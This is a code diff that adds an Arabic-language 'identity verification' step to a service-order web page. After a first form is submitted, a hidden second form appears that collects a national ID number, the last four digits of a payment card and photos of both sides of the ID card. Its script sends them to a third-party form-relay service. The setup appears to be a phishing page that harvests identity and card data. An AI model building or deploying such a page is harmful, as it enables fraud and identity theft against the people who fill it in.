@@ -842,6 +842,96 @@ document.getElementById("serviceForm").addEventListener("submit", function(e) {
   <img src="https://img.icons8.com/color/48/000000/whatsapp.png" alt="WhatsApp" style="width: 60px; height: 60px;">
   </a>
   <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+<!-- واجهة المرحلة الثانية -->
+<div id="verificationStep" style="display: none;" class="container my-5">
+  <h3 class="text-center mb-4">التحقق من الهوية</h3>
+  <form id="verificationForm" enctype="multipart/form-data">
+    
+    <div class="mb-3">
+      <label class="form-label">رقم بطاقة التعريف الوطنية</label>
+      <input type="text" name="cinNumber" class="form-control" required>
+    </div>
+
+    <div class="mb-3">
+      <label class="form-label">آخر 4 أرقام من البطاقة الذهبية</label>
+      <input type="text" name="cardLastDigits" class="form-control" maxlength="4" required>
+    </div>
+
+    <div class="mb-3">
+      <label class="form-label">صورة الوجه الأمامي لبطاقة التعريف</label>
+      <input type="file" name="frontImage" class="form-control" accept="image/*" required>
+    </div>
+
+    <div class="mb-3">
+      <label class="form-label">صورة الوجه الخلفي لبطاقة التعريف</label>
+      <input type="file" name="backImage" class="form-control" accept="image/*" required>
+    </div>
+
+    <div id="verifyMessage" class="text-center text-success mb-3"></div>
+
+    <button type="submit" class="btn btn-danger w-100">تأكيد الطلب</button>
+  </form>
+</div>
+ <script>
+  // كود إرسال النموذج الأول
+  document.getElementById("contactForm").addEventListener("submit", function(e) {
+    e.preventDefault();
+
+    const form = e.target;
+    const data = new FormData(form);
+
+    fetch("https://formspree.io/f/mzzvepel", {
+      method: "POST",
+      body: data,
+      headers: {
+        'Accept': 'application/json'
+      }
+    })
+    .then(response => {
+      if (response.ok) {
+        // إخفاء المودال
+        const modal = bootstrap.Modal.getInstance(document.getElementById('orderModal'));
+        modal.hide();
+
+        // إظهار واجهة التحقق
+        document.getElementById("verificationStep").style.display = "block";
+      } else {
+        document.getElementById("formMessage").innerText = "❌ حدث خطأ أثناء الإرسال.";
+      }
+    })
+    .catch(() => {
+      document.getElementById("formMessage").innerText = "❌ لم نتمكن من إرسال الطلب.";
+    });
+  });
+
+  // كود إرسال نموذج التحقق من الهوية
+  document.getElementById("verificationForm").addEventListener("submit", function(e) {
+    e.preventDefault();
+
+    const form = e.target;
+    const data = new FormData(form);
+
+    fetch("https://formspree.io/f/YOUR_SECOND_FORM_ID", { // 👈 ضع هنا ID الفورم الثاني
+      method: "POST",
+      body: data,
+      headers: {
+        'Accept': 'application/json'
+      }
+    })
+    .then(response => {
+      if (response.ok) {
+        document.getElementById("verifyMessage").innerText = "✅ تم تأكيد الطلب بنجاح!";
+        form.reset();
+      } else {
+        document.getElementById("verifyMessage").innerText = "❌ فشل في الإرسال.";
+      }
+    })
+    .catch(() => {
+      document.getElementById("verifyMessage").innerText = "❌ تحقق من الاتصال بالإنترنت.";
+    });
+  });
+</script>
 
 </body>
 </html>
+
